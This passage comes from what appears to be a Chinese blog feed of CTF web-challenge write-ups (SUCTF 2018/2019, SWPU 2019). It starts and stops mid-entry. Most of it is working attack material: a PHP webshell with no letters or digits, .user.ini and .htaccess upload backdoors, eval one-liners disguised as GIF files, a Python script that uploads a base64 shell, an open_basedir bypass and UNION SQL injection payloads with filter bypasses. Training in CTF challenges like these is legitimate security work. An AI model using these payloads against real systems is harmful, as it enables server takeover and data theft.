    <content><![CDATA[<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$data</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$contents</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$black_char</span> <span class="token keyword">as</span> <span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"illegal char"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>     
<span class="token punctuation">}</span> </code></pre>
<p>发现需要使用不带数字和字母的<img src="/2021/09/19/suctf-2018-getshell/289CBA51.png" alt="img"></p>
<p>UTF-8编码的某个汉字，并将其中某个字符取出来，比如’和’{2}的结果是”\x8c”，其取反即为字母s</p>
<pre><code>&lt;?=$_=[];$__.=$_;$____=$_==$_;$___=~茉[$____];$___.=~内[$____];$___.=~茉[$____];$___.=~苏[$____];$___.=~的[$____];$___.=~咩[$____];$_____=_;$_____.=~课[$____];$_____.=~尬[$____];$_____.=~笔[$____];$_____.=~端[$____];$__________=$$_____;$___($__________[~瞎[$____]]);</code></pre>
<p><img src="/2021/09/19/suctf-2018-getshell/image-20210919153709028.png" alt="image-20210919153709028"></p>
]]></content>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>SUCTF:2019-CheckIn</title>
    <url>/2021/06/15/suctf-2019-checkin/</url>
    <content><![CDATA[<p><a href="https://buuoj.cn/challenges#[SUCTF%202019]CheckIn">https://buuoj.cn/challenges#[SUCTF%202019]CheckIn</a></p>
<h2 id="user-ini文件上传后门"><a href="#user-ini文件上传后门" class="headerlink" title=".user.ini文件上传后门"></a>.user.ini文件上传后门</h2><p>可以看“Web:.user.ini文件上传后门”</p>
<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="SUCTF:2019-CheckIn"></a>SUCTF:2019-CheckIn</h2><pre><code>&lt;?php
if (exif_imagetype("image.gif") != IMAGETYPE_GIF) {
    echo "The picture is not a gif";
}
?&gt;
if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
echo "File is not an image";
return; 
}</code></pre>
<p><img src="/2021/06/15/suctf-2019-checkin/image-20210616120647894.png" alt="image-20210616120647894"></p>
<p>过滤了&lt;?</p>
<p>user.ini文件形成后门原理就是会在执行所有的php文件之前包含.user.ini所指定的文件</p>
<p>所以我们构造  ini文件内容为  auto_prepend_file=1.jpg</p>
<pre><code>GIF89a
auto_prepend_file=1.jpg</code></pre>
<p>过滤了&lt;?，进行了文件头的检测，加一个GIF89a</p>
<pre><code>GIF89a
&lt;script language=php&gt; @eval($_POST[1])&lt;/script&gt;</code></pre>
<p>Your dir uploads/365c7675ba6b8855fe632bc4420ce021<br>Your files :<br>array(5) { [0]=&gt; string(1) “.” [1]=&gt; string(2) “..” [2]=&gt; string(9) “.user.ini” [3]=&gt; string(5) “1.jpg” [4]=&gt; string(9) “index.php” }</p>
<p>上传蚁剑连接：</p>
<pre><code>url/uploads/365c7675ba6b8855fe632bc4420ce021/index.php</code></pre>
<p>虚拟终端执行命令  cat/flag</p>
<p><img src="/2021/06/15/suctf-2019-checkin/image-20210616121058497.png" alt="image-20210616121058497"></p>
]]></content>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>SUCTF：2019-EasyWeb</title>
    <url>/2021/08/07/suctf-2019-easyweb/</url>
    <content><![CDATA[<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function">get_the_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// webadmin will remove your upload file every 20 min!!!! </span>
    <span class="token variable">$userdir</span> <span class="token operator">=</span> <span class="token string">"upload/tmp_"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$tmp_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/ph/i"</span><span class="token punctuation">,</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'&lt;?'</span><span class="token punctuation">)</span><span class="token operator">!==</span>False<span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 文件中存在“&lt;?”就返回“^_^”</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
        <span class="token variable">$path</span><span class="token operator">=</span> <span class="token variable">$userdir</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">;</span>
        @<span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">,</span> <span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token variable">$hhh</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'One inch long, one inch strong!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span><span class="token punctuation">,</span> <span class="token variable">$hhh</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Try something else!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$character_type</span> <span class="token operator">=</span> <span class="token function">count_chars</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$character_type</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Almost there!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p>异或脚本：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function">finds</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$index</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token variable">$a</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">58</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">62</span><span class="token punctuation">,</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">92</span><span class="token punctuation">,</span><span class="token number">93</span><span class="token punctuation">,</span><span class="token number">94</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token number">125</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">129</span><span class="token punctuation">,</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">131</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">133</span><span class="token punctuation">,</span><span class="token number">134</span><span class="token punctuation">,</span><span class="token number">135</span><span class="token punctuation">,</span><span class="token number">136</span><span class="token punctuation">,</span><span class="token number">137</span><span class="token punctuation">,</span><span class="token number">138</span><span class="token punctuation">,</span><span class="token number">139</span><span class="token punctuation">,</span><span class="token number">140</span><span class="token punctuation">,</span><span class="token number">141</span><span class="token punctuation">,</span><span class="token number">142</span><span class="token punctuation">,</span><span class="token number">143</span><span class="token punctuation">,</span><span class="token number">144</span><span class="token punctuation">,</span><span class="token number">145</span><span class="token punctuation">,</span><span class="token number">146</span><span class="token punctuation">,</span><span class="token number">147</span><span class="token punctuation">,</span><span class="token number">148</span><span class="token punctuation">,</span><span class="token number">149</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">151</span><span class="token punctuation">,</span><span class="token number">152</span><span class="token punctuation">,</span><span class="token number">153</span><span class="token punctuation">,</span><span class="token number">154</span><span class="token punctuation">,</span><span class="token number">155</span><span class="token punctuation">,</span><span class="token number">156</span><span class="token punctuation">,</span><span class="token number">157</span><span class="token punctuation">,</span><span class="token number">158</span><span class="token punctuation">,</span><span class="token number">159</span><span class="token punctuation">,</span><span class="token number">160</span><span class="token punctuation">,</span><span class="token number">161</span><span class="token punctuation">,</span><span class="token number">162</span><span class="token punctuation">,</span><span class="token number">163</span><span class="token punctuation">,</span><span class="token number">164</span><span class="token punctuation">,</span><span class="token number">165</span><span class="token punctuation">,</span><span class="token number">166</span><span class="token punctuation">,</span><span class="token number">167</span><span class="token punctuation">,</span><span class="token number">168</span><span class="token punctuation">,</span><span class="token number">169</span><span class="token punctuation">,</span><span class="token number">170</span><span class="token punctuation">,</span><span class="token number">171</span><span class="token punctuation">,</span><span class="token number">172</span><span class="token punctuation">,</span><span class="token number">173</span><span class="token punctuation">,</span><span class="token number">174</span><span class="token punctuation">,</span><span class="token number">175</span><span class="token punctuation">,</span><span class="token number">176</span><span class="token punctuation">,</span><span class="token number">177</span><span class="token punctuation">,</span><span class="token number">178</span><span class="token punctuation">,</span><span class="token number">179</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">,</span><span class="token number">181</span><span class="token punctuation">,</span><span class="token number">182</span><span class="token punctuation">,</span><span class="token number">183</span><span class="token punctuation">,</span><span class="token number">184</span><span class="token punctuation">,</span><span class="token number">185</span><span class="token punctuation">,</span><span class="token number">186</span><span class="token punctuation">,</span><span class="token number">187</span><span class="token punctuation">,</span><span class="token number">188</span><span class="token punctuation">,</span><span class="token number">189</span><span class="token punctuation">,</span><span class="token number">190</span><span class="token punctuation">,</span><span class="token number">191</span><span class="token punctuation">,</span><span class="token number">192</span><span class="token punctuation">,</span><span class="token number">193</span><span class="token punctuation">,</span><span class="token number">194</span><span class="token punctuation">,</span><span class="token number">195</span><span class="token punctuation">,</span><span class="token number">196</span><span class="token punctuation">,</span><span class="token number">197</span><span class="token punctuation">,</span><span class="token number">198</span><span class="token punctuation">,</span><span class="token number">199</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">201</span><span class="token punctuation">,</span><span class="token number">202</span><span class="token punctuation">,</span><span class="token number">203</span><span class="token punctuation">,</span><span class="token number">204</span><span class="token punctuation">,</span><span class="token number">205</span><span class="token punctuation">,</span><span class="token number">206</span><span class="token punctuation">,</span><span class="token number">207</span><span class="token punctuation">,</span><span class="token number">208</span><span class="token punctuation">,</span><span class="token number">209</span><span class="token punctuation">,</span><span class="token number">210</span><span class="token punctuation">,</span><span class="token number">211</span><span class="token punctuation">,</span><span class="token number">212</span><span class="token punctuation">,</span><span class="token number">213</span><span class="token punctuation">,</span><span class="token number">214</span><span class="token punctuation">,</span><span class="token number">215</span><span class="token punctuation">,</span><span class="token number">216</span><span class="token punctuation">,</span><span class="token number">217</span><span class="token punctuation">,</span><span class="token number">218</span><span class="token punctuation">,</span><span class="token number">219</span><span class="token punctuation">,</span><span class="token number">220</span><span class="token punctuation">,</span><span class="token number">221</span><span class="token punctuation">,</span><span class="token number">222</span><span class="token punctuation">,</span><span class="token number">223</span><span class="token punctuation">,</span><span class="token number">224</span><span class="token punctuation">,</span><span class="token number">225</span><span class="token punctuation">,</span><span class="token number">226</span><span class="token punctuation">,</span><span class="token number">227</span><span class="token punctuation">,</span><span class="token number">228</span><span class="token punctuation">,</span><span class="token number">229</span><span class="token punctuation">,</span><span class="token number">230</span><span class="token punctuation">,</span><span class="token number">231</span><span class="token punctuation">,</span><span class="token number">232</span><span class="token punctuation">,</span><span class="token number">233</span><span class="token punctuation">,</span><span class="token number">234</span><span class="token punctuation">,</span><span class="token number">235</span><span class="token punctuation">,</span><span class="token number">236</span><span class="token punctuation">,</span><span class="token number">237</span><span class="token punctuation">,</span><span class="token number">238</span><span class="token punctuation">,</span><span class="token number">239</span><span class="token punctuation">,</span><span class="token number">240</span><span class="token punctuation">,</span><span class="token number">241</span><span class="token punctuation">,</span><span class="token number">242</span><span class="token punctuation">,</span><span class="token number">243</span><span class="token punctuation">,</span><span class="token number">244</span><span class="token punctuation">,</span><span class="token number">245</span><span class="token punctuation">,</span><span class="token number">246</span><span class="token punctuation">,</span><span class="token number">247</span><span class="token punctuation">,</span><span class="token number">248</span><span class="token punctuation">,</span><span class="token number">249</span><span class="token punctuation">,</span><span class="token number">250</span><span class="token punctuation">,</span><span class="token number">251</span><span class="token punctuation">,</span><span class="token number">252</span><span class="token punctuation">,</span><span class="token number">253</span><span class="token punctuation">,</span><span class="token number">254</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">27</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">27</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$k</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                    <span class="token keyword">echo</span> <span class="token variable">$string</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span>
                    <span class="token keyword">echo</span> <span class="token string">'%'</span> <span class="token punctuation">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'^%'</span> <span class="token punctuation">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span>
                    <span class="token variable">$index</span><span class="token operator">++</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$index</span> <span class="token operator">==</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token function">finds</span><span class="token punctuation">(</span><span class="token string">"_GET"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<pre><code>?_=${%86%86%86%86^%d9%c1%c3%d2}{%86}();&amp;%86=phpinfo</code></pre>
<p><img src="/2021/08/07/suctf-2019-easyweb/image-20210901205321199.png" alt="image-20210901205321199"></p>
<p>可以看见phpinfo页面，版本7.2，由于这里各种限制，所以我们就只能从get_the_flag()函数下手了<br>可以看见是上传文件，对后缀名进行了过滤，不能上传有ph的后缀文件，phtml，php等也不能上传了，<br>可以考虑.htaccess和.user.ini，不过这里.user.ini好像不行<br>对内容进行了过滤，不能包含&lt;?，由于这里版本太高，所以<script language="php"></script>无法使用<br>这里的解决方法是将一句话进行base64编码，然后在.htaccess中利用php伪协议进行解码<br>还有个文件头检测，好办，一般都用GIF89进行绕过，但是这里会出现问题，.htaccess文件会无法生效<br>我们可以使用#define width 1337 #define height 1337进行绕过，#在.htaccess中表示注释<br>所以我们的.htaccess文件内容如下：</p>
<pre><code>#define width 1337
#define height 1337 
AddType application/x-httpd-php .ahhh
php_value auto_append_file "php://filter/convert.base64-decode/resource=./shell.ahhh"</code></pre>
<p>shell.ahhh</p>
<pre><code>GIF89a12        #12是为了补足8个字节，满足base64编码的规则
PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs/Pg==</code></pre>
<p>上传监本</p>
<pre class=" language-Python"><code class="language-Python">import requests
import base64

htaccess = b"""
#define width 1337
#define height 1337 
AddType application/x-httpd-php .ahhh
php_value auto_append_file "php://filter/convert.base64-decode/resource=./shell.ahhh"
"""
shell = b"GIF89a12" + base64.b64encode(b"<?php eval($_REQUEST['cmd']);?>")
url = "http://95670a2d-e895-4364-bb7b-94939098a4b6.node3.buuoj.cn/?_=${%86%86%86%86^%d9%c1%c3%d2}{%86}();&%86=get_the_flag"

files = {'file':('.htaccess',htaccess,'image/jpeg')}
data = {"upload":"Submit"}
response = requests.post(url=url, data=data, files=files)
print(response.text)

files = {'file':('shell.ahhh',shell,'image/jpeg')}
response = requests.post(url=url, data=data, files=files)
print(response.text)</code></pre>
<p>得到路径</p>
<p><img src="/2021/08/07/suctf-2019-easyweb/image-20210903131131780.png" alt="image-20210903131131780"></p>
<p>访问shell</p>
<pre><code>chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('/THis_Is_tHe_F14g'));</code></pre>
<p>phpinfo里也有答案</p>
<p><img src="/2021/08/07/suctf-2019-easyweb/image-20210903180330393.png" alt="image-20210903180330393"></p>
]]></content>
  </entry>
  <entry>
    <title>SWPU:2019-Web1</title>
    <url>/2021/07/10/swpu-2019-web1/</url>
    <content><![CDATA[<p>一个登录界面</p>
<p>随便注册用户登录以后</p>
<p><img src="/2021/07/10/swpu-2019-web1/1.png" alt="1"></p>
<p>输入1‘</p>
<p><img src="/2021/07/10/swpu-2019-web1/2.png" alt="2"></p>
<p>输入order by是提示标题含有敏感词汇,</p>
<p>题目环境过滤了空格，我们使用/**/来进行绕过过滤了or，因此我们无法使用order by 以及information_schema这个库因为过滤了注释符，所以查询语句的最后我们要闭合单引号</p>
<pre class=" language-php"><code class="language-php"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21/**/'</span></code></pre>
<p><img src="/2021/07/10/swpu-2019-web1/3.png" alt="3"></p>
<pre><code>-1'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'</code></pre>
<p>无报错</p>
<p><img src="/2021/07/10/swpu-2019-web1/4.png" alt="4"></p>
<pre><code>-1'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23/**/'</code></pre>
<p>由此可见有22列回显在2,3处</p>
<p><img src="/2021/07/10/swpu-2019-web1/3.png" alt="3"></p>
<p>查表</p>
<pre class=" language-php"><code class="language-php"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'</span></code></pre>
<p><img src="/2021/07/10/swpu-2019-web1/5.png" alt="5"></p>
<p>设第二列别名为b</p>
<pre class=" language-php"><code class="language-php"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/b,3/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'</span></code></pre>
<p><img src="/2021/07/10/swpu-2019-web1/6.png" alt="6"></p>
<p>设第三列别名为b</p>
<pre class=" language-php"><code class="language-php"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'</span></code></pre>
<p><img src="/2021/07/10/swpu-2019-web1/7.png" alt="7"></p>
<h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><p>在 mysql =&gt; 5 的版本中存在库information_schema,记录着mysql中所有表的结构，通常，在mysql sqli中，我们会通过此库中的表去获取其他表的结构，即表名，列名等。但是这个库也会经常被WAF过滤。当我们通过暴力破解获取到表名后，该如何进行下一步利用呢？</p>
<p>在information_schema中，除了SCHEMATA，TABLES，COLUMNS有表信息外，高版本的mysql中，还有INNODB_TABLES及INNODB_COLUMNS中记录着表结构。</p>
<p><a href="https://links.jianshu.com/go?to=https://evi1cg.me/archives/sqli_without_knowing_columns_names.html%230x01-%E4%B8%8D%E4%BD%BF%E7%94%A8%E8%A1%A8%E5%90%8D%E6%9F%A5%E8%AF%A2">0x01 不使用表名查询</a></p>
<p>正常的查询如下：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/16739626-e310681eae4f665f.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/978" alt="img"></p>
<p>其中，列名为id,name,pass,mail,phone，使用union查询</p>
<pre class=" language-php"><code class="language-php">select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> union select <span class="token operator">*</span> from users<span class="token punctuation">;</span></code></pre>
<p><img src="https://upload-images.jianshu.io/upload_images/16739626-41f2e37c6267d297.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1004" alt="img"></p>
<p>接着，就可以继续使用数字来对应列,如3对应了表里面的pass:</p>
<pre class=" language-php"><code class="language-php">select `<span class="token number">3</span>` <span class="token function">from</span> <span class="token punctuation">(</span>select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> union select <span class="token operator">*</span> from users<span class="token punctuation">)</span>a<span class="token punctuation">;</span></code></pre>
<p><img src="https://upload-images.jianshu.io/upload_images/16739626-4a4ddedcaecd3838.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200" alt="img"></p>
<p>当 ` 不能使用的时候，使用别名来代替：</p>
<pre class=" language-php"><code class="language-php">select b <span class="token function">from</span> <span class="token punctuation">(</span>select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">as</span> b<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> union select <span class="token operator">*</span> from users<span class="token punctuation">)</span>a<span class="token punctuation">;</span></code></pre>
<p><img src="https://upload-images.jianshu.io/upload_images/16739626-d081adfc464a4fd3.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200" alt="img"></p>
<p>在注入中查询多个列：</p>
